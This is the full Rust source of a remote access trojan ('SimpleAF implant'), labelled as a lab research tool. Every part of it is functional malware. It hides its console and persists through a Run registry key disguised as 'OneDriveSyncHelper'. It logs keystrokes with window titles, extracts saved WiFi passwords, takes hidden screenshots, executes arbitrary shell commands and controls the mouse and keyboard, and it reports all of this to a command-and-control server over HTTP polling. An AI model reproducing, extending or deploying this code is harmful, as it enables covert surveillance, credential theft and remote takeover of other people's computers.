// SimpleAF implant - minimal RAT for security research in authorized lab environments.
// Operator console lives in server.js (Node/Express); tasking is plain HTTP polling.

use rand::Rng;
use serde::{Serialize, Deserialize};
use std::process::Command;
use std::thread;
use std::time::Duration;
use lazy_static::lazy_static;
use std::sync::Mutex;

#[cfg(target_os = "windows")]
use winapi::um::winuser::{
    SetCursorPos, mouse_event, keybd_event, KEYEVENTF_KEYUP, 
    MOUSEEVENTF_LEFTDOWN, MOUSEEVENTF_LEFTUP, GetAsyncKeyState, GetKeyState,
    GetForegroundWindow, GetWindowTextW, GetWindowTextLengthW
};
#[cfg(target_os = "windows")]
use winapi::um::processthreadsapi::GetCurrentProcessId;
#[cfg(target_os = "windows")]
use winapi::um::wincon::FreeConsole;
#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;

#[cfg(target_os = "windows")]
const CREATE_NO_WINDOW: u32 = 0x08000000;

#[derive(Serialize, Deserialize)]
struct CommandMsg {
    action: String,
    params: Option<String>,
}

lazy_static! {
    static ref CURRENT_WORKING_DIR: Mutex<String> = Mutex::new(String::from("C:\\"));
    static ref PREVIOUS_KEY_STATES: Mutex<[bool; 256]> = Mutex::new([false; 256]);
}

// ========== HIDE CONSOLE WINDOW ==========
#[cfg(target_os = "windows")]
fn hide_console_window() {
    unsafe {
        FreeConsole();
    }
}

#[cfg(not(target_os = "windows"))]
fn hide_console_window() {}

// ========== STEALTH COMMAND EXECUTION ==========
#[cfg(target_os = "windows")]
fn execute_system_command(command: &str, working_dir: &str) -> Result<String, String> {
    let output = Command::new("cmd")
        .args(&["/C", command])
        .current_dir(working_dir)
        .creation_flags(CREATE_NO_WINDOW)
        .output();
    
    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);
            let result = format!("{}{}", stdout, stderr);
            
            if result.trim().is_empty() {
                Ok(String::new())
            } else {
                Ok(result)
            }
        }
        Err(e) => Err(format!("Execution failed: {}", e)),
    }
}

#[cfg(not(target_os = "windows"))]
fn execute_system_command(command: &str, working_dir: &str) -> Result<String, String> {
    match Command::new("sh").args(&["-c", command]).current_dir(working_dir).output() {
        Ok(output) => Ok(String::from_utf8_lossy(&output.stdout).to_string()),
        Err(e) => Err(format!("Execution failed: {}", e)),
    }
}

// ========== GET ACTIVE WINDOW TITLE ==========
#[cfg(target_os = "windows")]
fn get_foreground_window_title() -> String {
    unsafe {
        let hwnd = GetForegroundWindow();
        if hwnd.is_null() {
            return String::new();
        }
        
        let length = GetWindowTextLengthW(hwnd);
        if length == 0 {
            return String::new();
        }
        
        let mut buffer: Vec<u16> = vec![0; (length + 1) as usize];
        GetWindowTextW(hwnd, buffer.as_mut_ptr(), length + 1);
        
        String::from_utf16_lossy(&buffer[..length as usize])
    }
}

#[cfg(not(target_os = "windows"))]
fn get_foreground_window_title() -> String {
    String::new()
}

// ========== KEYLOGGER ==========
#[cfg(target_os = "windows")]
fn capture_keystrokes() -> String {
    let mut result = String::new();
    let mut last_states = PREVIOUS_KEY_STATES.lock().unwrap();
    
    unsafe {
        let shift_active = (GetAsyncKeyState(0x10) & 0x8000u16 as i16) != 0;
        let caps_active = (GetKeyState(0x14) & 0x0001) != 0;
        let uppercase_mode = shift_active ^ caps_active;
        
        let key_mappings: Vec<(i32, char, char)> = vec![
            (0x30, '0', ')'), (0x31, '1', '!'), (0x32, '2', '@'), (0x33, '3', '#'),
            (0x34, '4', '$'), (0x35, '5', '%'), (0x36, '6', '^'), (0x37, '7', '&'),
            (0x38, '8', '*'), (0x39, '9', '('),
            (0x41, 'a', 'A'), (0x42, 'b', 'B'), (0x43, 'c', 'C'), (0x44, 'd', 'D'),
            (0x45, 'e', 'E'), (0x46, 'f', 'F'), (0x47, 'g', 'G'), (0x48, 'h', 'H'),
            (0x49, 'i', 'I'), (0x4A, 'j', 'J'), (0x4B, 'k', 'K'), (0x4C, 'l', 'L'),
            (0x4D, 'm', 'M'), (0x4E, 'n', 'N'), (0x4F, 'o', 'O'), (0x50, 'p', 'P'),
            (0x51, 'q', 'Q'), (0x52, 'r', 'R'), (0x53, 's', 'S'), (0x54, 't', 'T'),
            (0x55, 'u', 'U'), (0x56, 'v', 'V'), (0x57, 'w', 'W'), (0x58, 'x', 'X'),
            (0x59, 'y', 'Y'), (0x5A, 'z', 'Z'),
            (0xBA, ';', ':'), (0xBB, '=', '+'), (0xBC, ',', '<'), (0xBD, '-', '_'),
            (0xBE, '.', '>'), (0xBF, '/', '?'), (0xC0, '`', '~'), (0xDB, '[', '{'),
            (0xDC, '\\', '|'), (0xDD, ']', '}'), (0xDE, '\'', '"'),
        ];
        
        for (vk, normal, shifted) in key_mappings {
            let pressed = (GetAsyncKeyState(vk) & 0x0001) != 0;
            
            if pressed && !last_states[vk as usize] {
                let ch = if shift_active || (vk >= 0x41 && vk <= 0x5A && uppercase_mode) {
                    shifted
                } else {
                    normal
                };
                result.push(ch);
                last_states[vk as usize] = true;
            } else if !pressed {
                last_states[vk as usize] = false;
            }
        }
        
        let special_keys: Vec<(i32, &str)> = vec![
            (0x20, " "), (0x0D, "\n"), (0x09, "    "), (0x08, "[BACKSPACE]"),
            (0x1B, "[ESC]"), (0x2E, "[DEL]"), (0x24, "[HOME]"), (0x23, "[END]"),
            (0x21, "[PGUP]"), (0x22, "[PGDN]"), (0x70, "[F1]"), (0x71, "[F2]"),
            (0x72, "[F3]"), (0x73, "[F4]"), (0x74, "[F5]"), (0x75, "[F6]"),
            (0x76, "[F7]"), (0x77, "[F8]"), (0x78, "[F9]"), (0x79, "[F10]"),
            (0x7A, "[F11]"), (0x7B, "[F12]"),
        ];
        
        for (vk, ch) in special_keys {
            let pressed = (GetAsyncKeyState(vk) & 0x0001) != 0;
            if pressed && !last_states[vk as usize] {
                result.push_str(ch);
                last_states[vk as usize] = true;
            } else if !pressed {
                last_states[vk as usize] = false;
            }
        }
    }
    
    if !result.is_empty() {
        let window_title = get_foreground_window_title();
        if !window_title.is_empty() {
            return format!("[{}] {}\n", window_title, result);
        }
    }
    
    result
}

#[cfg(not(target_os = "windows"))]
fn capture_keystrokes() -> String {
    String::new()
}

// ========== PERSISTENCE ==========
#[cfg(target_os = "windows")]
fn register_auto_start(executable_path: &str) -> bool {
    use winreg::RegKey;
    use winreg::enums::*;
    
    match RegKey::predef(HKEY_CURRENT_USER).open_subkey_with_flags(
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        KEY_WRITE
    ) {
        Ok(key) => {
            match key.set_value("OneDriveSyncHelper", &executable_path) {
                Ok(_) => true,
                Err(_) => false
            }
        },
        Err(_) => false
    }
}

#[cfg(not(target_os = "windows"))]
fn register_auto_start(_executable_path: &str) -> bool {
    false
}

// ========== WIFI CREDENTIALS ==========
#[cfg(target_os = "windows")]
fn extract_wifi_credentials() -> String {
    let cwd = CURRENT_WORKING_DIR.lock().unwrap();
    let mut output_results = String::new();
    output_results.push_str("=== WiFi Credentials ===\n\n");
    
    match execute_system_command("netsh wlan show profiles", &cwd) {
        Ok(profiles_output) => {
            let mut profiles_list = Vec::new();
            
            for line in profiles_output.lines() {
                if line.contains("All User Profile") {
                    if let Some(profile) = line.split(':').last() {
                        profiles_list.push(profile.trim().to_string());
                    }
                }
            }
            
            if profiles_list.is_empty() {
                return "No WiFi profiles found".to_string();
            }
            
            for profile_name in profiles_list {
                let cmd = format!("netsh wlan show profile \"{}\" key=clear", profile_name);
                match execute_system_command(&cmd, &cwd) {
                    Ok(details) => {
                        output_results.push_str(&format!("[+] Profile: {}\n", profile_name));
                        
                        for line in details.lines() {
                            if line.contains("Authentication") {
                                if let Some(auth) = line.split(':').last() {
                                    output_results.push_str(&format!("    Auth: {}\n", auth.trim()));
                                }
                            }
                            if line.contains("Cipher") {
                                if let Some(cipher) = line.split(':').last() {
                                    output_results.push_str(&format!("    Cipher: {}\n", cipher.trim()));
                                }
                            }
                            if line.contains("Key Content") {
                                if let Some(password) = line.split(':').last() {
                                    let pwd = password.trim();
                                    if !pwd.is_empty() {
                                        output_results.push_str(&format!("    Password: {}\n", pwd));
                                    } else {
                                        output_results.push_str("    Password: [Open Network]\n");
                                    }
                                }
                            }
                        }
                        output_results.push_str("\n");
                    }
                    Err(e) => {
                        output_results.push_str(&format!("[+] Profile: {} (Error: {})\n\n", profile_name, e));
                    }
                }
            }
        }
        Err(e) => return format!("Failed to get WiFi profiles: {}", e),
    }
    
    output_results
}

#[cfg(not(target_os = "windows"))]
fn extract_wifi_credentials() -> String {
    "WiFi stealing only available on Windows".to_string()
}

// ========== COMMAND EXECUTION ==========
fn process_command(raw_command: &str) -> String {
    let current_dir = CURRENT_WORKING_DIR.lock().unwrap().clone();
    let command = raw_command.trim();
    
    if command.starts_with("cd ") {
        let target_dir = command[3..].trim();
        let cd_command = format!("cd /d {} && cd", target_dir);
        match execute_system_command(&cd_command, &current_dir) {
            Ok(output) => {
                let new_path = output.trim().to_string();
                if !new_path.is_empty() && !new_path.contains("error") && !new_path.contains("not recognized") {
                    let mut current = CURRENT_WORKING_DIR.lock().unwrap();
                    *current = new_path.clone();
                    format!("Changed to: {}\n{}>", new_path, *current)
                } else {
                    format!("Directory not found: {}\n{}>", target_dir, current_dir)
                }
            }
            Err(e) => format!("Failed to change directory: {}\n{}>", e, current_dir),
        }
    }
    else if command == "cd" {
        format!("{}\n{}>", current_dir, current_dir)
    }
    else {
        let full_command = format!("cd /d {} && {}", current_dir, command);
        match execute_system_command(&full_command, &current_dir) {
            Ok(output) => {
                if output.trim().is_empty() {
                    format!("[Command executed]\n{}>", current_dir)
                } else {
                    format!("{}\n{}>", output.trim_end(), current_dir)
                }
            }
            Err(e) => format!("Error: {}\n{}>", e, current_dir),
        }
    }
}

// ========== HTTP CLIENT ==========
fn create_http_client() -> reqwest::blocking::Client {
    reqwest::blocking::Client::builder()
        .timeout(Duration::from_secs(30))
        .build()
        .unwrap()
}

// ========== SYSTEM INFORMATION ==========
fn get_system_hostname() -> String {
    match execute_system_command("hostname", "C:\\") {
        Ok(out) => out.trim().to_string(),
        Err(_) => "Unknown".to_string(),
    }
}

// ========== SCREENSHOT ==========
#[cfg(target_os = "windows")]
fn capture_display() -> Option<String> {
    let output = Command::new("powershell")
        .args(&[
            "-WindowStyle", "Hidden",
            "-NoProfile",
            "-ExecutionPolicy", "Bypass",
            "-Command",
            "Add-Type -AssemblyName System.Windows.Forms; \
             Add-Type -AssemblyName System.Drawing; \
             $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; \
             $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height; \
             $graphics = [System.Drawing.Graphics]::FromImage($bitmap); \
             $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size); \
             $ms = New-Object System.IO.MemoryStream; \
             $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png); \
             [Convert]::ToBase64String($ms.ToArray()); \
             $graphics.Dispose(); $bitmap.Dispose(); $ms.Dispose()"
        ])
        .creation_flags(CREATE_NO_WINDOW)
        .output();
    
    match output {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            if stdout.len() > 100 {
                Some(stdout.trim().to_string())
            } else {
                None
            }
        }
        Err(_) => None
    }
}

#[cfg(not(target_os = "windows"))]
fn capture_display() -> Option<String> {
    None
}

// ========== MOUSE CONTROL ==========
#[cfg(target_os = "windows")]
fn move_cursor_position(x: i32, y: i32) {
    unsafe { SetCursorPos(x, y); }
}

#[cfg(not(target_os = "windows"))]
fn move_cursor_position(_x: i32, _y: i32) {}

#[cfg(target_os = "windows")]
fn perform_mouse_click() {
    unsafe {
        mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
        thread::sleep(Duration::from_millis(30));
        mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
    }
}

#[cfg(not(target_os = "windows"))]
fn perform_mouse_click() {}

#[cfg(target_os = "windows")]
fn simulate_key_press(key: char) {
    let vk = match key.to_ascii_lowercase() {
        'a' => 0x41, 'b' => 0x42, 'c' => 0x43, 'd' => 0x44,
        'e' => 0x45, 'f' => 0x46, 'g' => 0x47, 'h' => 0x48,
        'i' => 0x49, 'j' => 0x4A, 'k' => 0x4B, 'l' => 0x4C,
        'm' => 0x4D, 'n' => 0x4E, 'o' => 0x4F, 'p' => 0x50,
        'q' => 0x51, 'r' => 0x52, 's' => 0x53, 't' => 0x54,
        'u' => 0x55, 'v' => 0x56, 'w' => 0x57, 'x' => 0x58,
        'y' => 0x59, 'z' => 0x5A,
        ' ' => 0x20, '\n' => 0x0D, '\t' => 0x09,
        _ => 0x41
    };
    unsafe {
        keybd_event(vk as u8, 0, 0, 0);
        thread::sleep(Duration::from_millis(30));
        keybd_event(vk as u8, 0, KEYEVENTF_KEYUP, 0);
    }
}

#[cfg(not(target_os = "windows"))]
fn simulate_key_press(_key: char) {}

#[cfg(target_os = "windows")]
fn launch_interactive_shell() -> String {
    match Command::new("cmd").args(&["/C", "start cmd.exe"]).spawn() {
        Ok(_) => "Shell window opened".to_string(),
        Err(e) => format!("Failed: {}", e)
    }
}

#[cfg(not(target_os = "windows"))]
fn launch_interactive_shell() -> String {
    "Shell only available on Windows".to_string()
}

// ========== MAIN LOOP ==========
fn main() {
    // Hide console window immediately
    hide_console_window();
    
    // Small delay to ensure hide works
    thread::sleep(Duration::from_millis(500));
    
    let mut rng = rand::thread_rng();
    let session_token: String = (0..16)
        .map(|_| {
            let charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            let idx = rng.gen_range(0..charset.len());
            charset.chars().nth(idx).unwrap()
        })
        .collect();
    
    // Setup persistence on first run
    if let Ok(exe_path) = std::env::current_exe() {
        if let Some(path_str) = exe_path.to_str() {
            register_auto_start(path_str);
        }
    }
    
    let hostname = get_system_hostname();
    let username = std::env::var("USERNAME").unwrap_or_else(|_| "UNKNOWN".to_string());
    #[cfg(target_os = "windows")]
    let pid = unsafe { GetCurrentProcessId() };
    #[cfg(not(target_os = "windows"))]
    let pid = 0;
    
    let c2_server = std::env::var("C2_SERVER")
        .unwrap_or_else(|_| String::from("http://127.0.0.1:3307"));
    let http_client = create_http_client();
    
    let registration_data = serde_json::json!({
        "key": session_token,
        "hostname": hostname,
        "username": username,
        "pid": pid
    });
    
    let _ = http_client
        .post(&format!("{}/api/register", c2_server))
        .json(&registration_data)
        .send();
    
    let mut input_monitoring = false;
    let mut keylog_buffer = String::new();
    let mut last_transmission = std::time::Instant::now();
    
    loop {
        thread::sleep(Duration::from_millis(50));
        
        if input_monitoring {
            let keys = capture_keystrokes();
            if !keys.is_empty() {
                keylog_buffer.push_str(&keys);
            }
            
            if !keylog_buffer.is_empty() && (last_transmission.elapsed() >= Duration::from_secs(2) || keylog_buffer.len() > 500) {
                let _ = http_client
                    .post(&format!("{}/api/keylog/{}", c2_server, session_token))
                    .json(&serde_json::json!({ "keys": keylog_buffer }))
                    .send();
                keylog_buffer.clear();
                last_transmission = std::time::Instant::now();
            }
        }
        
        if let Ok(response) = http_client
            .get(&format!("{}/api/command/{}", c2_server, session_token))
            .send()
        {
            if response.status().is_success() {
                if let Ok(cmd) = response.json::<CommandMsg>() {
                    match cmd.action.as_str() {
                        "cmd" => {
                            if let Some(params) = cmd.params {
                                let result = process_command(&params);
                                let _ = http_client
                                    .post(&format!("{}/api/result/{}", c2_server, session_token))
                                    .json(&serde_json::json!({ "result": result }))
                                    .send();
                            }
                        }
                        "wifi" => {
                            let wifi_data = extract_wifi_credentials();
                            let _ = http_client
                                .post(&format!("{}/api/result/{}", c2_server, session_token))
                                .json(&serde_json::json!({ "result": wifi_data }))
                                .send();
                        }
                        "screenshot" => {
                            let client_clone = create_http_client();
                            let token_clone = session_token.clone();
                            let server_url = c2_server.to_string();
                            
                            thread::spawn(move || {
                                if let Some(image) = capture_display() {
                                    let _ = client_clone
                                        .post(&format!("{}/api/screenshot/{}", server_url, token_clone))
                                        .json(&serde_json::json!({ "image": image }))
                                        .send();
                                    let _ = client_clone
                                        .post(&format!("{}/api/result/{}", server_url, token_clone))
                                        .json(&serde_json::json!({ "result": "[+] Screenshot captured!" }))
                                        .send();
                                } else {
                                    let _ = client_clone
                                        .post(&format!("{}/api/result/{}", server_url, token_clone))
                                        .json(&serde_json::json!({ "result": "[-] Screenshot failed" }))
                                        .send();
                                }
                            });
                        }
                        "keylog_start" => {
                            input_monitoring = true;
                            keylog_buffer.clear();
                            let mut last_states = PREVIOUS_KEY_STATES.lock().unwrap();
                            for i in 0..last_states.len() {
                                last_states[i] = false;
                            }
                            let _ = http_client
                                .post(&format!("{}/api/result/{}", c2_server, session_token))
                                .json(&serde_json::json!({ "result": "[+] Keylogger started!" }))
                                .send();
                        }
                        "keylog_stop" => {
                            input_monitoring = false;
                            let _ = http_client
                                .post(&format!("{}/api/result/{}", c2_server, session_token))
                                .json(&serde_json::json!({ "result": "[+] Keylogger stopped" }))
                                .send();
                        }
                        "shell" => {
                            let result = launch_interactive_shell();
                            let _ = http_client
                                .post(&format!("{}/api/result/{}", c2_server, session_token))
                                .json(&serde_json::json!({ "result": result }))
                                .send();
                        }
                        "move" => {
                            if let Some(params) = cmd.params {
                                let coords: Vec<&str> = params.split(',').collect();
                                if coords.len() == 2 {
                                    let x: i32 = coords[0].parse().unwrap_or(0);
                                    let y: i32 = coords[1].parse().unwrap_or(0);
                                    move_cursor_position(x, y);
                                    let _ = http_client
                                        .post(&format!("{}/api/result/{}", c2_server, session_token))
                                        .json(&serde_json::json!({ "result": format!("[+] Mouse moved to {},{}", x, y) }))
                                        .send();
                                }
                            }
                        }
                        "click" => {
                            perform_mouse_click();
                            let _ = http_client
                                .post(&format!("{}/api/result/{}", c2_server, session_token))
                                .json(&serde_json::json!({ "result": "[+] Mouse clicked" }))
                                .send();
                        }
                        "key" => {
                            if let Some(params) = cmd.params {
                                if let Some(ch) = params.chars().next() {
                                    simulate_key_press(ch);
                                    let _ = http_client
                                        .post(&format!("{}/api/result/{}", c2_server, session_token))
                                        .json(&serde_json::json!({ "result": format!("[+] Key pressed: {}", ch) }))
                                        .send();
                                }
                            }
                        }
                        _ => {}
                    }
                }
            }
        }
    }
}
